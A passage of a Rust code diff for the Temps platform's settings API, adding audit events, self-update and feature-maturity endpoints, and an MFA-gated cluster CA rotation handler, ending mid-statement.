@@ -1,33 +1,51 @@
+// SPDX-FileCopyrightText: 2024-2026 Temps Contributors
+// SPDX-License-Identifier: MIT OR Apache-2.0
+
 use crate::disk_status::DiskSpaceCheckResult;
-use crate::ConfigService;
+use crate::{ConfigService, EffectiveTelemetryPolicies};
 use axum::{
     extract::{Extension, State},
-    http::StatusCode,
+    http::{header, StatusCode},
     response::IntoResponse,
     routing::{delete, get, post, put},
     Json, Router,
 };
-use rand::Rng;
+use rand::RngExt;
 use serde::{Deserialize, Serialize};
 use sha2::Digest;
 use std::sync::Arc;
 use temps_auth::{permission_guard, RequireAuth};
 use temps_core::error_builder::ErrorBuilder;
 use temps_core::{
-    problemdetails::Problem, AiConfigSettings, AppSettings, AuditContext, AuditLogger,
-    AuditOperation, BuildLimitsSettings, ClusterDnsSettings, ContainerLogSettings,
-    DiskSpaceAlertSettings, LetsEncryptSettings, MetricsStoreKind, PublicHostnameStrategy,
-    RateLimitSettings, RequestMetadata, ScreenshotSettings, SecurityHeadersSettings,
+    problemdetails::Problem, AiChatLimitsSettings, AiConfigSettings, AiWorkspaceFileLimitsSettings,
+    AppSettings, AuditContext, AuditLogger, AuditOperation, BuildLimitsSettings, CloudSettings,
+    ClusterDnsSettings, ContainerLogSettings, DiskSpaceAlertSettings, ImageRetentionSettings,
+    LetsEncryptSettings, MetricsStoreKind, MonitoringSettings, ObservabilityCompressionSettings,
+    ObservabilityRetentionSettings, PublicHostnameStrategy, RateLimitSettings, RequestMetadata,
+    RequestTimeoutSettings, ScreenshotSettings, SecurityHeadersSettings,
+    MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR, MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR,
 };
 use tracing::{error, info};
 use utoipa::{OpenApi, ToSchema};
 
 pub struct SettingsState {
     pub config_service: Arc<ConfigService>,
+    pub encryption_service: Arc<temps_core::EncryptionService>,
     pub audit_service: Arc<dyn AuditLogger>,
+    pub sensitive_action_authorizer: Arc<dyn temps_core::SensitiveActionAuthorizer>,
     pub route_table_refresher: Option<Arc<dyn temps_core::route_table::RouteTableRefresher>>,
     /// Node enrollment token minting/listing/revocation (ADR-020 WS-1.1).
     pub enrollment_token_service: Arc<crate::enrollment_tokens::EnrollmentTokenService>,
+    /// Result slot of the background release-update notifier (`temps serve`
+    /// writes it). `None` in host processes that don't run the notifier
+    /// (e.g. the standalone proxy's plugin context) — the update-status
+    /// endpoint then reports "no update known".
+    pub update_status: Option<Arc<temps_core::UpdateStatusSlot>>,
+    /// Applies a release and restarts the server. `None` in hosts that cannot
+    /// meaningfully restart themselves (e.g. the standalone proxy) — the
+    /// update endpoints then report the feature as unsupported here rather
+    /// than pretending it is merely misconfigured.
+    pub self_updater: Option<Arc<dyn temps_core::SelfUpdater>>,
 }
 
 #[derive(Debug, Clone, serde::Serialize)]
@@ -35,12 +53,137 @@ struct SettingsUpdatedAudit {
     context: AuditContext,
 }
 
+#[derive(Debug, Clone, serde::Serialize)]
+struct ClusterCaRotatedAudit {
+    context: AuditContext,
+    previous_fingerprint: String,
+    new_fingerprint: String,
+    revoked_enrollment_tokens: u64,
+}
+
+impl AuditOperation for ClusterCaRotatedAudit {
+    fn operation_type(&self) -> String {
+        "CLUSTER_CA_ROTATED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|error| anyhow::anyhow!("Failed to serialize audit operation {error}"))
+    }
+}
+
 impl AuditOperation for SettingsUpdatedAudit {
     fn operation_type(&self) -> String {
         "SETTINGS_UPDATED".to_string()
     }
-    fn user_id(&self) -> i32 {
-        self.context.user_id
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
+    }
+}
+
+/// The two ADR-042 §6.3 bulk-activation guard settings, resolved to the values
+/// that would actually be **in effect**.
+///
+/// Effective rather than raw, for both of the jobs this type has. The
+/// permission bar must compare like with like — `None` and `Some(5.0)` are the
+/// same guard, and treating a client that omits the field as "widening from
+/// nothing" would refuse ordinary saves. And the audit record has to name the
+/// number that was really in force, because the point of writing it down is that
+/// somebody months later can say what this instance's spend guard was on a given
+/// day without also having to know which build's defaults applied.
+#[derive(Debug, Clone, Copy, PartialEq)]
+struct BulkActivationGuards {
+    anomaly_factor: f32,
+    rate_limit_spans_per_sec: Option<u32>,
+}
+
+impl From<&CloudSettings> for BulkActivationGuards {
+    fn from(cloud: &CloudSettings) -> Self {
+        Self {
+            anomaly_factor: cloud.effective_bulk_anomaly_factor(),
+            rate_limit_spans_per_sec: cloud.effective_bulk_rate_limit_spans_per_sec(),
+        }
+    }
+}
+
+/// `CLOUD_TELEMETRY_BULK_GUARD_UPDATED` — a change to one of ADR-042 §6.3's two
+/// bulk-activation guard settings, carrying the values on both sides.
+///
+/// A separate event from `SETTINGS_UPDATED`, which records only who saved and
+/// from where. That is enough for a presentation setting and not nearly enough
+/// for these two: widening the anomaly factor from 5× to 50× raises the ceiling
+/// on what a purchase-triggered activation may spend without any human
+/// confirming it, and under one undifferentiated `SETTINGS_UPDATED` row it is
+/// indistinguishable from somebody changing the instance's display name. An
+/// audit trail that cannot answer "when did this instance's spend guard change,
+/// and to what" is not an audit trail for a money guard.
+#[derive(Debug, Clone, serde::Serialize)]
+struct CloudTelemetryBulkGuardUpdatedAudit {
+    context: AuditContext,
+    previous_anomaly_factor: f32,
+    new_anomaly_factor: f32,
+    previous_rate_limit_spans_per_sec: Option<u32>,
+    new_rate_limit_spans_per_sec: Option<u32>,
+    /// Whether this change *loosened* the money guard — i.e. raised the anomaly
+    /// factor. Recorded as its own field so the one direction that matters is
+    /// greppable without a reader having to compare two floats themselves.
+    widened_anomaly_factor: bool,
+}
+
+impl AuditOperation for CloudTelemetryBulkGuardUpdatedAudit {
+    fn operation_type(&self) -> String {
+        "CLOUD_TELEMETRY_BULK_GUARD_UPDATED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
+    }
+}
+
+/// Audit record for a console-triggered platform update. Written before the
+/// process exits, so the trail survives the restart it causes.
+#[derive(Debug, Clone, serde::Serialize)]
+struct PlatformUpdateStartedAudit {
+    context: AuditContext,
+    /// Version the server was running when the update was requested.
+    from_version: String,
+    /// Explicitly pinned target, or `None` for "newest on this channel".
+    target_version: Option<String>,
+}
+
+impl AuditOperation for PlatformUpdateStartedAudit {
+    fn operation_type(&self) -> String {
+        "PLATFORM_UPDATE_STARTED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
     }
     fn ip_address(&self) -> Option<String> {
         self.context.ip_address.clone()
@@ -84,6 +227,19 @@ pub struct AppSettingsResponse {
     pub preview_domain: String,
     /// Public edge target that synced DNS records point at (IP → A/AAAA, else CNAME).
     pub edge_target: Option<String>,
+    /// Whether plain-HTTP requests to the console host are redirected to HTTPS.
+    /// `None` inherits the per-host certificate heuristic; `Some(b)` is an
+    /// explicit operator override. No sensitive content.
+    pub console_force_https: Option<bool>,
+    /// Port the main Pingora proxy listens on (parsed from `--address`), the
+    /// same value `ConfigService::proxy_port()` feeds into
+    /// `compute_deployment_url`/`compute_environment_url` when `external_url`
+    /// is unset. The console uses this to preview a project's real
+    /// `{slug}-{env_slug}.{preview_domain}:{port}` URL before it's deployed.
+    pub proxy_port: u16,
+
+    /// Managed control-plane destination and explicit export consent flags.
+    pub cloud: CloudSettings,
 
     // Screenshot settings
     pub screenshots: ScreenshotSettings,
@@ -100,6 +256,11 @@ pub struct AppSettingsResponse {
 
     // Docker registry settings with masked password
     pub docker_registry: DockerRegistrySettingsMasked,
+
+    /// Prefix applied to implicit Docker Hub base images in generated
+    /// Dockerfiles (e.g. autopack's `FROM node:22-slim`). No sensitive
+    /// content, passed through as-is. `None`/empty disables rewriting.
+    pub registry_mirror_prefix: Option<String>,
 
     // Monitoring settings
     pub disk_space_alert: DiskSpaceAlertSettings,
@@ -122,6 +283,16 @@ pub struct AppSettingsResponse {
     // Metrics monitoring settings (clickhouse_url masked)
     pub monitoring: MonitoringSettingsMasked,
 
+    /// Number of enabled, running services the MetricsScraper currently
+    /// includes. Used for the lightweight storage estimate in the UI.
+    pub monitored_services_count: Option<u64>,
+
+    /// TimescaleDB compression delays for immutable proxy logs and OTel spans.
+    pub observability_compression: ObservabilityCompressionSettings,
+
+    /// Retention windows for raw proxy logs and OpenTelemetry data.
+    pub observability_retention: ObservabilityRetentionSettings,
+
     /// The storage backend the runtime is **actually** using for metrics,
     /// after reconciling the `monitoring.store` toggle with the server's
     /// `TEMPS_CLICKHOUSE_*` configuration. When `monitoring.store` is
@@ -130,6 +301,12 @@ pub struct AppSettingsResponse {
     /// though `monitoring.store` says `click_house`. The UI shows this as the
     /// effective backend and warns when it diverges from the configured store.
     pub effective_metrics_store: MetricsStoreKind,
+
+    /// Storage backend actually used for proxy logs, OTel spans, and OTel
+    /// metrics. OTel logs remain TimescaleDB-backed. Unlike resource metrics,
+    /// these domains switch to ClickHouse whenever the server-level ClickHouse
+    /// connection is configured; they do not use the monitoring store toggle.
+    pub effective_observability_store: MetricsStoreKind,
 
     // Outbound TLS verification toggle
     pub insecure_tls: bool,
@@ -150,6 +327,32 @@ pub struct AppSettingsResponse {
     /// Build-time resource limits (control-plane only). No sensitive content,
     /// passed through as-is.
     pub build_limits: BuildLimitsSettings,
+
+    /// Per-turn limits for the AI chat. No sensitive content.
+    pub ai_chat_limits: AiChatLimitsSettings,
+    /// Persistent AI workspace file transfer and preview limits.
+    pub ai_workspace_file_limits: AiWorkspaceFileLimitsSettings,
+    /// Upstream request/connection timeouts (hard ceiling + defaults) applied
+    /// by the proxy to customer app traffic. No sensitive content.
+    pub request_timeouts: RequestTimeoutSettings,
+    /// Per-upstream concurrent-connection cap applied by the proxy to
+    /// customer app traffic. No sensitive content. See issue #646.
+    pub connection_limits: temps_core::ConnectionLimitSettings,
+    /// Upper bounds a project/environment override may not exceed. No
+    /// sensitive content — this is operator policy the settings UI edits
+    /// directly. Unenforced by default.
+    pub tenant_resource_ceilings: temps_core::TenantResourceCeilings,
+    /// Whether admins may apply a release from the console. This is the
+    /// database-backed toggle only — a server started with
+    /// `--disable-self-update` refuses regardless of what this says, which
+    /// `GET /settings/update` reports as the authoritative answer.
+    pub self_update: temps_core::SelfUpdateSettings,
+    /// Deployment-image retention policy. No sensitive content, passed through
+    /// as-is so the settings UI can show and edit the system-wide default.
+    pub image_retention: ImageRetentionSettings,
+    /// MCP (Model Context Protocol) server toggle (ADR-039). No sensitive
+    /// content — passed through as-is so the settings UI can show and edit it.
+    pub mcp_server: temps_core::McpServerSettings,
 }
 
 /// Monitoring settings with the ClickHouse DSN masked.
@@ -204,6 +407,7 @@ pub struct AgentSandboxSettingsMasked {
     pub cpu_limit: f64,
     pub memory_limit_mb: u64,
     pub network_mode: String,
+    pub sandbox_backend: String,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
@@ -237,10 +441,24 @@ pub struct MultiNodeSettingsMasked {
     /// SHA-256 fingerprint of the cluster CA certificate (public — operators can
     /// verify it out of band; the CA private key is never exposed).
     pub cluster_ca_fingerprint: Option<String>,
+    /// Effective cluster-wide container address pool. `None` only when the
+    /// singleton network configuration could not be read.
+    pub cluster_network: Option<ClusterNetworkSettings>,
     /// Node resource-alert thresholds (percent); `None` = that alert disabled.
     pub node_cpu_alert_percent: Option<f64>,
     pub node_memory_alert_percent: Option<f64>,
     pub node_disk_alert_percent: Option<f64>,
+}
+
+/// Read-only cluster network state. Pool changes are performed on the control
+/// plane through `temps network setup-multi-node`, which enforces that no
+/// existing node allocation can be stranded by an in-place edit.
+#[derive(Debug, Clone, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
+pub struct ClusterNetworkSettings {
+    pub compute_pool_cidr: String,
+    pub subnet_prefix_len: u8,
+    pub allocation_count: u64,
+    pub locked: bool,
 }
 
 /// DNS provider settings with masked sensitive fields
@@ -263,11 +481,22 @@ pub struct DockerRegistrySettingsMasked {
 
 impl From<AppSettings> for AppSettingsResponse {
     fn from(settings: AppSettings) -> Self {
+        // Resolved before the literal below starts moving fields out of
+        // `settings`; absence means "never configured", which reads as default.
+        let self_update = settings.self_update();
         Self {
             external_url: settings.external_url,
             internal_url: settings.internal_url,
             preview_domain: settings.preview_domain,
             edge_target: settings.edge_target,
+            console_force_https: settings.console_force_https,
+            // Overridden by the handler via `with_proxy_port` — this struct
+            // has no access to `ConfigService` here, only the DB-backed
+            // `AppSettings` row. 8080 mirrors `ConfigService::proxy_port()`'s
+            // own fallback so an un-reconciled response is never worse than
+            // that.
+            proxy_port: 8080,
+            cloud: settings.cloud,
             screenshots: settings.screenshots,
             letsencrypt: settings.letsencrypt,
             dns_provider: DnsProviderSettingsMasked {
@@ -292,6 +521,7 @@ impl From<AppSettings> for AppSettingsResponse {
                 tls_verify: settings.docker_registry.tls_verify,
                 ca_certificate: settings.docker_registry.ca_certificate,
             },
+            registry_mirror_prefix: settings.registry_mirror_prefix,
             disk_space_alert: settings.disk_space_alert,
             container_logs: settings.container_logs,
             agent_sandbox: AgentSandboxSettingsMasked {
@@ -320,6 +550,10 @@ impl From<AppSettings> for AppSettingsResponse {
                 cpu_limit: settings.agent_sandbox.cpu_limit,
                 memory_limit_mb: settings.agent_sandbox.memory_limit_mb,
                 network_mode: settings.agent_sandbox.network_mode,
+                sandbox_backend: settings
+                    .agent_sandbox
+                    .sandbox_backend
+                    .unwrap_or_else(|| "docker".to_string()),
             },
             ai_config: settings.ai_config,
             preview_gateway: PreviewGatewaySettingsMasked {
@@ -337,6 +571,7 @@ impl From<AppSettings> for AppSettingsResponse {
                     .cluster_ca_cert_pem
                     .as_deref()
                     .and_then(|pem| temps_core::node_pki::ca_fingerprint_sha256(pem).ok()),
+                cluster_network: None,
                 node_cpu_alert_percent: settings.multi_node.node_cpu_alert_percent,
                 node_memory_alert_percent: settings.multi_node.node_memory_alert_percent,
                 node_disk_alert_percent: settings.multi_node.node_disk_alert_percent,
@@ -346,17 +581,39 @@ impl From<AppSettings> for AppSettingsResponse {
             // the handler overrides it with the runtime-reconciled value once
             // the ClickHouse env-var state is known (via `with_effective_store`).
             effective_metrics_store: settings.monitoring.store.clone(),
+            effective_observability_store: MetricsStoreKind::TimescaleDb,
             monitoring: MonitoringSettingsMasked::from(settings.monitoring),
+            monitored_services_count: None,
+            observability_compression: settings.observability_compression,
+            observability_retention: settings.observability_retention,
             insecure_tls: settings.insecure_tls,
             setup_complete: settings.setup_complete,
             require_mfa_for_admins: settings.require_mfa_for_admins,
             cluster_dns: settings.cluster_dns,
             build_limits: settings.build_limits,
+            ai_chat_limits: settings.ai_chat_limits,
+            ai_workspace_file_limits: settings.ai_workspace_file_limits,
+            request_timeouts: settings.request_timeouts,
+            connection_limits: settings.connection_limits,
+            tenant_resource_ceilings: settings.tenant_resource_ceilings,
+            self_update,
+            image_retention: settings.image_retention,
+            mcp_server: settings.mcp_server,
         }
     }
 }
 
 impl AppSettingsResponse {
+    fn with_cluster_network_state(mut self, state: Option<crate::ClusterNetworkState>) -> Self {
+        self.multi_node.cluster_network = state.map(|state| ClusterNetworkSettings {
+            compute_pool_cidr: state.compute_pool_cidr,
+            subnet_prefix_len: state.subnet_prefix_len,
+            allocation_count: state.allocation_count,
+            locked: state.allocation_count > 0,
+        });
+        self
+    }
+
     /// Reconcile `effective_metrics_store` with the server's ClickHouse
     /// configuration. The runtime only uses ClickHouse when both the
     /// `monitoring.store` toggle is `click_house` AND all `TEMPS_CLICKHOUSE_*`
@@ -370,6 +627,64 @@ impl AppSettingsResponse {
             } else {
                 MetricsStoreKind::TimescaleDb
             };
+        self.effective_observability_store = if clickhouse_enabled {
+            MetricsStoreKind::ClickHouse
+        } else {
+            MetricsStoreKind::TimescaleDb
+        };
+        self
+    }
+
+    /// Sets the real proxy listener port, resolved from `ConfigService`
+    /// (unavailable to the plain `From<AppSettings>` conversion above).
+    fn with_proxy_port(mut self, proxy_port: u16) -> Self {
+        self.proxy_port = proxy_port;
+        self
+    }
+
+    fn with_effective_timescale_state(
+        mut self,
+        policies: EffectiveTelemetryPolicies,
+        monitored_services_count: Option<u64>,
+    ) -> Self {
+        self.monitored_services_count = monitored_services_count;
+
+        if self.effective_metrics_store == MetricsStoreKind::TimescaleDb {
+            if let Some(days) = policies.metrics_raw_days {
+                self.monitoring.retention_raw_days = days;
+            }
+            if let Some(days) = policies.metrics_hourly_days {
+                self.monitoring.retention_hourly_days = days;
+            }
+            if let Some(years) = policies.metrics_daily_years {
+                self.monitoring.retention_daily_years = years;
+            }
+        }
+
+        if self.effective_observability_store == MetricsStoreKind::TimescaleDb {
+            if let Some(hours) = policies.proxy_logs_compression_hours {
+                self.observability_compression.proxy_logs_after_hours = hours;
+            }
+            if let Some(hours) = policies.otel_spans_compression_hours {
+                self.observability_compression.otel_spans_after_hours = hours;
+            }
+            if let Some(days) = policies.proxy_logs_retention_days {
+                self.observability_retention.proxy_logs_days = days;
+            }
+            if let Some(days) = policies.otel_spans_retention_days {
+                self.observability_retention.otel_spans_days = days;
+            }
+        }
+
+        if let Some(days) = policies.otel_logs_retention_days {
+            self.observability_retention.otel_logs_days = days;
+        }
+        if self.effective_observability_store == MetricsStoreKind::TimescaleDb {
+            if let Some(days) = policies.otel_metrics_retention_days {
+                self.observability_retention.otel_metrics_days = days;
+            }
+        }
+
         self
     }
 }
@@ -378,7 +693,12 @@ impl AppSettingsResponse {
 #[openapi(
     paths(
         get_settings,
+        get_update_status,
+        get_update_capability,
+        start_update,
+        check_for_update,
         get_disk_status,
+        get_feature_maturity,
         update_settings,
         generate_join_token,
         revoke_join_token,
@@ -386,6 +706,7 @@ impl AppSettingsResponse {
         mint_enrollment_token,
         list_enrollment_tokens,
         revoke_enrollment_token,
+        rotate_cluster_ca,
         refresh_route_table,
     ),
     components(schemas(
@@ -396,6 +717,7 @@ impl AppSettingsResponse {
         crate::disk_status::DiskSpaceCheckResult,
         ContainerLogSettings,
         ClusterDnsSettings,
+        CloudSettings,
         PublicHostnameStrategy,
         DnsProviderSettingsMasked,
         DockerRegistrySettingsMasked,
@@ -404,6 +726,8 @@ impl AppSettingsResponse {
         PreviewGatewaySettingsMasked,
         MultiNodeSettingsMasked,
         MonitoringSettingsMasked,
+        ObservabilityCompressionSettings,
+        ObservabilityRetentionSettings,
         MetricsStoreKind,
         SettingsUpdateResponse,
         GenerateJoinTokenResponse,
@@ -412,7 +736,23 @@ impl AppSettingsResponse {
         MintEnrollmentTokenResponse,
         EnrollmentTokenInfo,
         EnrollmentTokenListResponse,
+        RotateClusterCaRequest,
+        RotateClusterCaResponse,
         RouteRefreshResponse,
+        UpdateStatusResponse,
+        UpdateCapabilityResponse,
+        StartUpdateRequest,
+        StartUpdateResponse,
+        temps_core::SelfUpdateSettings,
+        temps_core::SelfUpdateAttempt,
+        temps_core::SelfUpdateBlocker,
+        temps_core::SelfUpdatePhase,
+        temps_core::SelfUpdateRestartMode,
+        temps_core::SelfUpdateStatus,
+        temps_core::ReleaseCheckResult,
+        temps_core::SupervisorKind,
+        temps_core::feature_maturity::FeatureMaturity,
+        temps_core::feature_maturity::Maturity,
     )),
     info(
         title = "Settings API",
@@ -427,7 +767,14 @@ pub fn configure_routes() -> Router<Arc<SettingsState>> {
     Router::new()
         .route("/settings", get(get_settings))
         .route("/settings", put(update_settings))
+        .route("/settings/update-status", get(get_update_status))
+        .route(
+            "/settings/update",
+            get(get_update_capability).post(start_update),
+        )
+        .route("/settings/update/check", post(check_for_update))
         .route("/settings/disk-status", get(get_disk_status))
+        .route("/v1/platform/feature-maturity", get(get_feature_maturity))
         .route("/settings/join-token/generate", post(generate_join_token))
         .route("/settings/join-token", delete(revoke_join_token))
         .route("/settings/join-token/status", get(get_join_token_status))
@@ -439,7 +786,30 @@ pub fn configure_routes() -> Router<Arc<SettingsState>> {
             "/settings/enrollment-tokens/{id}",
             delete(revoke_enrollment_token),
         )
+        .route("/settings/cluster-ca/rotate", post(rotate_cluster_ca))
         .route("/settings/routes/refresh", post(refresh_route_table))
+}
+
+/// Return the build-time compatibility promise for every user-facing feature.
+#[utoipa::path(
+    tag = "Platform",
+    get,
+    path = "/v1/platform/feature-maturity",
+    responses(
+        (status = 200, description = "Feature maturity registry for this build", body = [temps_core::feature_maturity::FeatureMaturity]),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions")
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn get_feature_maturity(
+    RequireAuth(auth): RequireAuth,
+) -> Result<impl IntoResponse, Problem> {
+    permission_guard!(auth, PlatformInfoRead);
+    Ok((
+        [(header::CACHE_CONTROL, "private, max-age=3600")],
+        Json(temps_core::feature_maturity::FEATURE_MATURITY),
+    ))
 }
 
 // ── Node enrollment tokens (ADR-020 WS-1.1) ──────────────────────────────────
@@ -461,8 +831,8 @@ pub struct MintEnrollmentTokenResponse {
     pub token: String,
     pub expires_at: String,
     pub max_uses: i32,
-    /// SHA-256 fingerprint of the cluster CA (if mTLS is set up). Pass it to the
-    /// worker as `temps join --ca-fingerprint <fp>` to verify the CA on join.
+    /// SHA-256 fingerprint of the cluster CA. Token issuance initializes the
+    /// CA when needed, so every newly minted token carries a trust pin.
     pub ca_fingerprint: Option<String>,
     pub message: String,
 }
@@ -480,6 +850,172 @@ pub struct EnrollmentTokenInfo {
 #[derive(Debug, Serialize, ToSchema)]
 pub struct EnrollmentTokenListResponse {
     pub tokens: Vec<EnrollmentTokenInfo>,
+}
+
+#[derive(Debug, Deserialize, ToSchema)]
+pub struct RotateClusterCaRequest {
+    /// Fingerprint observed through a trusted operator channel immediately
+    /// before rotation. The request fails if the active root changed.
+    pub expected_fingerprint: String,
+    /// Destructive-action guard. Must be exactly `ROTATE CLUSTER CA`.
+    pub confirmation: String,
+}
+
+#[derive(Debug, Serialize, ToSchema)]
+pub struct RotateClusterCaResponse {
+    pub previous_fingerprint: String,
+    pub new_fingerprint: String,
+    pub revoked_enrollment_tokens: u64,
+    pub message: String,
+}
+
+/// Replace a compromised cluster CA and invalidate outstanding enrollment
+/// tokens. Existing workers fail closed until they are re-enrolled.
+#[utoipa::path(
+    tag = "Settings",
+    post,
+    path = "/settings/cluster-ca/rotate",
+    request_body = RotateClusterCaRequest,
+    responses(
+        (status = 200, description = "Cluster CA rotated", body = RotateClusterCaResponse),
+        (status = 400, description = "Invalid confirmation or CA state"),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions"),
+        (status = 409, description = "Expected fingerprint is stale"),
+        (status = 428, description = "Fresh MFA verification required"),
+        (status = 500, description = "Internal server error")
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn rotate_cluster_ca(
+    RequireAuth(auth): RequireAuth,
+    State(app_state): State<Arc<SettingsState>>,
+    Extension(metadata): Extension<RequestMetadata>,
+    Json(req): Json<RotateClusterCaRequest>,
+) -> Result<impl IntoResponse, Problem> {
+    permission_guard!(auth, SettingsWrite);
+    permission_guard!(auth, ClusterCaRotate);
+
+    require_cluster_ca_rotation_authorization(
+        app_state.sensitive_action_authorizer.as_ref(),
+        &auth,
+    )
+    .await?;
+
+    if req.confirmation != "ROTATE CLUSTER CA" {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Confirmation Required")
+            .detail("confirmation must be exactly ROTATE CLUSTER CA")
+            .build());
+    }
+
+    let (replacement, result) = crate::cluster_ca::rotate_cluster_ca(
+        &app_state.config_service,
+        &app_state.encryption_service,
+        req.expected_fingerprint.trim(),
+    )
+    .await
+    .map_err(|error| {
+        use crate::cluster_ca::ClusterCaError;
+        use crate::ConfigServiceError;
+        match error {
+            ClusterCaError::Settings(ConfigServiceError::ClusterCaFingerprintMismatch) => {
+                ErrorBuilder::new(StatusCode::CONFLICT)
+                    .title("Cluster CA Changed")
+                    .detail("The active cluster CA no longer matches expected_fingerprint. Read the current fingerprint through a trusted channel before retrying.")
+                    .build()
+            }
+            ClusterCaError::Settings(ConfigServiceError::ClusterCaNotInitialized) => {
+                ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                    .title("Cluster CA Not Initialized")
+                    .detail("Mint an enrollment token to initialize the cluster CA before rotating it.")
+                    .build()
+            }
+            ClusterCaError::Settings(ConfigServiceError::InvalidConfiguration { .. }) => {
+                error!(%error, "Refused cluster CA rotation from an incomplete or invalid state");
+                ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                    .title("Invalid Cluster CA State")
+                    .detail("The active cluster CA state is incomplete or invalid. Check the server logs and restore the control-plane settings backup before retrying.")
+                    .build()
+            }
+            error => {
+                error!(%error, "Failed to rotate cluster CA");
+                ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                    .title("Cluster CA Rotation Failed")
+                    .detail("The cluster CA was not rotated. Check the server logs for details.")
+                    .build()
+            }
+        }
+    })?;
+    let new_fingerprint = temps_core::node_pki::ca_fingerprint_sha256(&replacement.cert_pem)
+        .map_err(|error| {
+            error!(%error, "Failed to fingerprint newly committed cluster CA");
+            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Cluster CA Rotation Incomplete")
+                .detail("The new CA was committed but its fingerprint response could not be generated. Read the current fingerprint from authenticated settings before re-enrolling workers.")
+                .build()
+        })?;
+
+    let audit = ClusterCaRotatedAudit {
+        context: AuditContext {
+            user_id: auth.user_id(),
+            ip_address: Some(metadata.ip_address.clone()),
+            user_agent: metadata.user_agent.clone(),
+        },
+        previous_fingerprint: result.previous_fingerprint.clone(),
+        new_fingerprint: new_fingerprint.clone(),
+        revoked_enrollment_tokens: result.revoked_enrollment_tokens,
+    };
+    if let Err(error) = app_state.audit_service.create_audit_log(&audit).await {
+        tracing::error!(%error, "Failed to record cluster CA rotation audit log");
+    }
+
+    Ok(Json(RotateClusterCaResponse {
+        previous_fingerprint: result.previous_fingerprint,
+        new_fingerprint,
+        revoked_enrollment_tokens: result.revoked_enrollment_tokens,
+        message: "Cluster CA rotated. Every worker must now be re-enrolled with a new single-use token and the new fingerprint.".to_string(),
+    }))
+}
+
+async fn require_cluster_ca_rotation_authorization(
+    authorizer: &dyn temps_core::SensitiveActionAuthorizer,
+    auth: &temps_auth::AuthContext,
+) -> Result<(), Problem> {
+    if !auth.is_session() || auth.session_id().is_none() {
+        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+            .title("Persisted Browser Session Required")
+            .detail("Cluster CA rotation cannot be performed with an API key, CLI token, deployment token, or non-persisted session. Sign in to the Temps console as an administrator.")
+            .value("error_code", "CLUSTER_CA_ROTATION_BROWSER_SESSION_REQUIRED")
+            .build());
+    }
+
+    if !auth.is_admin() {
+        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+            .title("Administrator Required")
+            .detail("Only a full Temps administrator may rotate the cluster CA. Platform administrators and delegated roles are not sufficient.")
+            .value("error_code", "CLUSTER_CA_ROTATION_ADMIN_REQUIRED")
+            .build());
+    }
+
+    let mfa_enabled = auth.user.as_ref().is_some_and(|user| user.mfa_enabled);
+    if !mfa_enabled {
+        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+            .title("MFA Enrollment Required")
+            .detail(
+                "Enroll an MFA method in account security settings before rotating the cluster CA.",
+            )
+            .value("error_code", "CLUSTER_CA_ROTATION_MFA_REQUIRED")
+            .value("setup_path", "/settings/security")
+            .build());
+    }
+
+    temps_auth::require_sensitive_action(
+        authorizer,
+        auth,
+        temps_core::SensitiveAction::RotateClusterCa,
+    )
+    .await
 }
 
 fn enrollment_error_to_problem(e: crate::enrollment_tokens::EnrollmentError) -> Problem {
@@ -531,21 +1067,30 @@ async fn mint_enrollment_token(
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsWrite);
 
-    // If a cluster CA already exists, embed its SHA-256 fingerprint so a joining
-    // node can verify the control plane's CA out of band (ADR-020 WS-2.2). The
-    // CA is minted lazily on the first mTLS enrollment, so the very first token
-    // may carry no fingerprint; subsequent tokens do.
-    let settings = app_state.config_service.get_settings().await.map_err(|e| {
+    // Initialize the cluster CA before minting the token. This makes the first
+    // enrollment as strongly pinned as every subsequent enrollment and avoids
+    // trust-on-first-use against the registration response.
+    let cluster_ca = crate::cluster_ca::ensure_cluster_ca(
+        &app_state.config_service,
+        &app_state.encryption_service,
+    )
+    .await
+    .map_err(|error| {
+        error!(%error, "Failed to initialize cluster CA before enrollment-token minting");
         ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
-            .title("Settings Error")
-            .detail(format!("Failed to read settings: {e}"))
+            .title("Cluster CA Initialization Failed")
+            .detail("The enrollment token was not created because the cluster trust root could not be initialized. Check the server logs for details.")
             .build()
     })?;
-    let ca_fingerprint = settings
-        .multi_node
-        .cluster_ca_cert_pem
-        .as_deref()
-        .and_then(|pem| temps_core::node_pki::ca_fingerprint_sha256(pem).ok());
+    let ca_fingerprint = Some(
